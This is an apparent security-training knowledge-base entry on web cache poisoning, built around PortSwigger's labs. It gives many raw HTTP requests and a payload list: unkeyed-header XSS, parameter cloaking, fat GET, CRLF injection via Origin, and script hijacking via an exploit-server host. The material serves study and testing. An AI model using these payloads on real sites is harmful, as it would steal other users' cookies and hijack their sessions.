---
title: "Web Cache Poisoning"
type: technique
tags: [exploitation, web, xss]
phase: exploitation
severity: high
date_created: 2026-05-13
date_updated: 2026-05-13
sources: [git-portswigger-all-labs]
---

# Web Cache Poisoning

## Overview

Web cache poisoning is an advanced attack technique that exploits caching behavior to cause a harmful HTTP response to be served to other users. The attack has two primary phases:

1. Elicit a harmful response from the origin server using manipulated input.
2. Get that response cached so it is served to other users with equivalent cache keys.

This technique can lead to:
- Cross-site scripting (XSS)
- Open redirects
- Injection of malicious JavaScript executed by every user who receives the cached page

Even short-lived caches can be re-poisoned continuously, making the effect persistent. Impact scales with the popularity of the poisoned page.

## How Caches Work

Web caches store server responses to reduce load and latency. On each request:
- **Cache hit** — response is served from cache.
- **Cache miss** — origin server responds and the cache may store the response.

**Cache key** — the set of request components used to determine whether a stored response can be reused. Typically includes URL path and Host header; may include query parameters and content type.

**Unkeyed inputs** — request components that influence the server response but are NOT included in the cache key. These are the attacker's primary exploitation surface. Common unkeyed inputs include:
- `X-Forwarded-Host`
- `X-Forwarded-For`
- `X-Forwarded-Scheme` / `X-Forwarded-Proto`
- `X-Host`
- `X-Original-URL`
- `User-Agent` (sometimes keyed, sometimes not)
- Cookies (selective)
- Certain query parameters (e.g. `utm_content`, analytics params)

**Cache types targeted** — web cache poisoning targets application-level (server-side) caches, not browser or DNS caches.

## Attack Techniques

### 1. Unkeyed Header Injection

Add a header not included in the cache key that the server reflects into the response. Classic example: `X-Forwarded-Host` reflected into a script `src` attribute.

```http
GET / HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: evil-user.net
```

Response:
```html
<script src="https://evil-user.net/static/analytics.js"></script>
```

Once cached, every user who hits the cache executes the attacker's script.

### 2. Reflected XSS via Unkeyed Header

```http
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>
```

Response:
```html
<meta property="og:image" content="https://a."><script>alert(1)</script>/cms/social.png" />
```

### 3. Unkeyed Cookie Poisoning

Some cookies are excluded from the cache key but still reflected in the response. Inject an XSS payload via the cookie value:

```
fehost=someString"-alert(1)-"someString
```

First request yields `cache: miss`, second request yields `cache: hit` — confirming the poisoned response is now cached.

### 4. Multiple Unkeyed Headers (X-Forwarded-Proto + X-Forwarded-Host)

When the server redirects HTTP to HTTPS using `X-Forwarded-Proto`, combine it with `X-Forwarded-Host` to redirect users to an attacker-controlled domain:

```http
GET / HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Proto: http
X-Forwarded-Host: exploit-server.net
```

The server issues a redirect to `https://exploit-server.net/`, which gets cached. All users following the cached redirect are sent to the attacker's server.

### 5. Unkeyed Query String Poisoning

Some caches exclude the entire query string from the cache key. If the query string is reflected in the response:

Use cache-busting headers to test safely:
```
Accept-Encoding: gzip, deflate, cachebuster
Accept: */*, text/cachebuster
Cookie: cachebuster=1
Origin: https://cachebuster.vulnerable-website.com
```

Once a reflective unkeyed query string is confirmed, remove the cache buster and send the poisoned request 15–20 times to get it cached.

### 6. Unkeyed Query Parameter Poisoning

Analytics parameters like `utm_content` are commonly excluded from cache keys. If the full URL is unsafely reflected:

```
GET /?utm_content=random'/><script>alert(1)</script>
```

Param Miner can automatically identify excluded parameters via "Guess GET parameters".

### 7. Parameter Cloaking

Exploits inconsistencies between how the cache and backend parse query parameters. The cache sees an excluded parameter; the backend processes injected content as a separate parameter.

Using a semicolon delimiter that the cache treats as part of one parameter but the backend parses as a separator:

```
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
```

- Cache keys on `callback=setCountryCookie` (utm_content is excluded, semicolon and everything after is part of utm_content as far as the cache is concerned).
- Backend parses `callback=alert(1)` as the winning value.
- Cached response calls `alert(1)` for all users.

JSONP exploitation variant:
```
GET /jsonp?callback=innocent?callback=alert(1)
```

Other cloaking tricks:
```
GET /?keyed=abc&excluded=123;keyed=poison
```

Use Param Miner "Bulk scan > Rails parameter cloaking scan" to detect automatically.

### 8. Fat GET Request

A GET request that includes a request body. The cache keys on the URL; the backend uses the body value instead.

```http
GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

callback=alert(1)
```

- Cache stores the response keyed on `callback=setCountryCookie`.
- Backend returns `alert(1)` as the callback.
- All users who receive the cached response trigger the payload.

### 9. URL Normalization

Some caches normalize URL-encoded characters before keying; the backend receives the decoded version. A 404 path that reflects the URL can be exploited:

```
GET /random</p><script>alert(1)</script><p> HTTP/1.1
```

The URL-encoded form of this path (`%3C`, `%3E`, etc.) is decoded by the cache before generating the key but decoded again by the browser on cache hit — executing the payload. Deliver the URL-encoded link to the victim; the cache hit decodes it and executes the script.

### 10. DOM-Based Cache Poisoning (Strict Cacheability)

When host data is embedded in a JSON object that client-side JavaScript passes to `innerHTML` or `document.write`:

1. Identify the JSON endpoint loaded by a geolocation/analytics script (e.g. `/resources/json/geolocate.json`).
2. Poison the cache so `X-Forwarded-Host` points to the exploit server.
3. On the exploit server, serve the JSON endpoint with an XSS payload:

```json
{ "country": "<img src=1 onerror=alert(document.cookie) />" }
```

4. Add `Access-Control-Allow-Origin: *` to allow cross-origin fetch.

### 11. Chaining Multiple Cache Poisoning Vulnerabilities

Combine two unkeyed inputs to achieve a higher-impact attack:

- `X-Original-URL: /setlang\es` — forces a 302 redirect (cacheable) that sets all users' language to Spanish, directing them to the localized page.
- `X-Forwarded-Host: exploit-server.net` — poisons the localized page to load a malicious translation JSON file containing DOM-XSS payload.

Sequence:
1. Poison `GET /?localized=1` via `X-Forwarded-Host` to load attacker's JSON.
2. While poisoned, also poison `GET /` via `X-Original-URL: /setlang\es` to redirect all users to the localized page.
3. Users land on the Spanish page which fetches the malicious JSON and triggers XSS.

Note: `X-Original-URL` responses that set cookies (`Set-Cookie`) are not cacheable — use the backslash variant to generate a cacheable 302 redirect.

### 12. Cache Key Injection

Exploit client-side parameter pollution via unencoded characters in a keyed parameter that flows into a script import URL:

```
GET /login?lang=en?utm_content=anythin
```

The `?` inside the `lang` value is not URL-encoded, so it appends to the reflected URL as a second query string delimiter. Combined with CRLF injection via the `Origin` header:

```
GET /js/localize.js?lang=en?utm_content=z&cors=1&x=1 HTTP/1.1
Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$
```

Then poison the login page cache:
```
GET /login?lang=en?utm_content=x%26cors=1%26x=1$$origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23 HTTP/2
```

Note: Use a capital `O` in `Origin` to comply with HTTP/2 header casing requirements.

### 13. Internal Cache Poisoning

Some applications use internal (application-level) caches that are separate from the CDN or proxy cache. These may have different keying logic. When `X-Forwarded-Host` is not initially detected:

1. Run Param Miner with the "Add dynamic cache buster" option enabled.
2. Once `X-Forwarded-Host` is confirmed, the internal cache stores partial fragments keyed on the full URL including the callback parameter.
3. Host override via `X-Forwarded-Host` causes script imports to point to the exploit server.
4. Send the request repeatedly until all dynamic resource URLs in the response reference the exploit server.

## Payloads

**Script source hijacking via X-Forwarded-Host:**
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: exploit-server.net
```

**XSS via reflected unkeyed header:**
```http
X-Forwarded-Host: a."><script>alert(document.cookie)</script>
```

**Unkeyed cookie XSS:**
```
fehost=someString"-alert(document.cookie)-"someString
```

**Unkeyed query parameter XSS:**
```
GET /?utm_content=random'/><script>alert(1)</script>
```

**Parameter cloaking via semicolon:**
```
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
```

**Fat GET:**
```http
GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

callback=alert(1)
```

**URL normalization XSS:**
```
GET /random</p><script>alert(1)</script><p> HTTP/1.1
```

**DOM XSS via poisoned JSON (exploit server):**
```json
{ "country": "<img src=1 onerror=alert(document.cookie) />" }
```
With response header: `Access-Control-Allow-Origin: *`

**Cache key injection (CRLF in Origin):**
```
GET /js/localize.js?lang=en?utm_content=z&cors=1&x=1 HTTP/1.1
Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$
```

## Detection

### Methodology

1. **Identify a cache oracle** — find a page or endpoint that indicates whether responses are cached (e.g. `X-Cache: hit/miss`, `Age` header, `Cache-Control: public`).

2. **Add a cache buster** — always test with a unique cache-busting parameter to avoid poisoning real user traffic:
```
GET /page.html?cb=1234
```
   Or use header-based busters:
```
Origin: https://cachebuster.target.com
Accept: */*, text/cachebuster
Cookie: cachebuster=1
Accept-Encoding: gzip, deflate, cachebuster
```

3. **Identify unkeyed inputs** — use Burp Suite's Param Miner extension:
   - Right-click request → "Guess headers"
   - Right-click request → "Guess GET parameters"
   - "Bulk scan > Rails parameter cloaking scan" for cloaking
   - Enable "Add dynamic cache buster" for internal cache detection
   - Review the Output tab for reflected or behavior-changing values

4. **Confirm cacheability** — send the same request twice and check for `X-Cache: hit` or a decreasing `Age` value on the second response.

5. **Elicit a harmful response** — inject payloads into the identified unkeyed input and confirm they appear in the response.

6. **Get it cached** — remove the cache buster and resend until the poisoned response is stored. Verify with a fresh request (no injected headers) from a different session.

### Indicators in Responses

| Header | Meaning |
|--------|---------|
| `X-Cache: miss` | Response served from origin; not yet cached |
| `X-Cache: hit` | Response served from cache |
| `Age: <seconds>` | How long the response has been cached |
| `Cache-Control: public` | Response is eligible for caching |
| `Vary: User-Agent` | User-Agent is part of the cache key |

### Tools

- **Burp Suite Param Miner** — automated discovery of unkeyed headers and parameters
- **Burp Repeater** — manual cache poisoning and confirmation
- **Burp Comparer** — diff responses to identify cache behavior changes

## PortSwigger Labs

### Apprentice

No Apprentice-level labs listed in the source material for this topic.

### Practitioner

**Lab 1 — Web cache poisoning with an unkeyed header** (Practitioner)
- `X-Forwarded-Host` is unkeyed and reflected in a script `src` attribute.
- Steps:
  1. Add a cache buster (`/?cb=1234`) to the request.
  2. Add `X-Forwarded-Host: YOUR-EXPLOIT-SERVER.exploit-server.net`.
  3. Confirm first request is `cache: miss`, second is `cache: hit`.
  4. Host `/resources/js/tracking.js` on exploit server with payload `alert(document.cookie)`.
  5. Remove cache buster and repeat until poisoned.
  6. Cache expires every ~30 seconds — act quickly.

**Lab 2 — Web cache poisoning with an unkeyed cookie** (Practitioner)
- Cookie `fehost` is reflected in the response but excluded from cache key.
- Payload: `fehost=someString"-alert(1)-"someString`
- First send: `cache: miss`. Second send: `cache: hit`. Lab solved.

**Lab 3 — Web cache poisoning with multiple headers** (Practitioner)
- `X-Forwarded-Proto: http` triggers a redirect; `X-Forwarded-Host` controls redirect destination.
- Combine both to redirect all users to the exploit server, which serves a malicious `tracking.js`.

**Lab 4 — Targeted web cache poisoning using an unknown header** (Practitioner)
- `Vary: User-Agent` means User-Agent is keyed — must match victim's agent.
- Use Param Miner to discover the undocumented `X-Host` header.
- Set `X-Host` to exploit server; observe 404 in exploit server access log to capture victim's User-Agent.
- Re-send the poison request with the victim's exact User-Agent value.

**Lab 5 — Web cache poisoning via an unkeyed query string** (Practitioner)
- Entire query string is unkeyed and reflected in the response.
- Use `Origin: https://cachebuster.vulnerable-website.com` as the cache buster (safe, unkeyed).
- Remove cache buster and send 15–20 times to poison reliably.

**Lab 6 — Web cache poisoning via an unkeyed query parameter** (Practitioner)
- `utm_content` parameter is excluded from cache key but reflected in the response.
- Detect with Param Miner "Guess GET parameters".
- Payload: `GET /?utm_content=random'/><script>alert(1)</script>`
- Send multiple times until cached.

**Lab 7 — Parameter cloaking** (Practitioner)
- `utm_content` is excluded from cache key; semicolon allows injecting a second `callback` value.
- `/js/geolocate.js` uses a JSONP-style callback function.
- Payload: `GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)`
- Cache keys on `callback=setCountryCookie`; backend uses `callback=alert(1)`.

**Lab 8 — Web cache poisoning via a fat GET request** (Practitioner)
- Server accepts and processes a request body on GET requests.
- Cache keys on URL query string; backend uses body parameter value.
- Send `callback=setCountryCookie` in URL, `callback=alert(1)` in body.
- Remove cache buster and re-poison until victim triggers it.

**Lab 9 — URL normalization** (Practitioner)
- Cache normalizes URL encoding before keying; backend reflects the decoded path in error pages.
- Payload path: `/random</p><script>alert(1)</script><p>`
- Request the path once to get it cached, then immediately deliver the URL-encoded link to the victim.
- The browser's URL-encoded form is decoded on cache hit, executing the script.

### Expert

**Lab 10 — Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria** (Expert)
- Host value is embedded in a JSON file (`/resources/json/geolocate.json`) loaded by client-side JS.
- `initgeolocation()` inserts JSON data into the DOM without sanitization.
- Use `X-Forwarded-Host` to redirect the JSON fetch to the exploit server.
- Exploit server serves: `{ "country": "<img src=1 onerror=alert(document.cookie) />" }` with `Access-Control-Allow-Origin: *`.

**Lab 11 — Combining web cache poisoning vulnerabilities** (Expert)
- Two vulnerabilities chained: `X-Original-URL` for redirect poisoning + `X-Forwarded-Host` for DOM XSS.
- `X-Original-URL: /setlang\es` (backslash triggers normalization to `/setlang/es`) generates a cacheable 302.
- Poison `GET /?localized=1` with `X-Forwarded-Host` to load malicious translation JSON.
- Poison `GET /` with `X-Original-URL: /setlang\es` to redirect all users to the Spanish (localized) page.
- Spanish page fetches poisoned JSON → DOM XSS triggers.

**Lab 12 — Cache key injection** (Expert)
- `lang` parameter is keyed but its value is reflected without URL-encoding into a script import URL.
- Unencoded `?` in the lang value allows appending parameters to the reflected URL.
- Cache is also dependent on the `Origin` header, enabling CRLF injection to smuggle response headers.
- First request: poison `/js/localize.js` cache entry with CRLF-injected `alert(1)` body.
- Second request: poison `/login` cache to import the malicious localize.js.
- Use capital `O` in `Origin` header for HTTP/2 compliance.

**Lab 13 — Internal cache poisoning** (Expert)
- Application uses an internal cache with different keying logic from the CDN.
- Standard Param Miner fails; must enable "Add dynamic cache buster" option.
- `X-Forwarded-Host` overrides host for all resource URLs including `/resources/js/analytics.js` and `/js/geolocate.js`.
- Exploit server hosts `/js/geolocate.js` with `alert(document.cookie)` payload.
- Send requests repeatedly until all three dynamic URLs in the response reference the exploit server (internal cache fragment poisoning requires multiple hits).
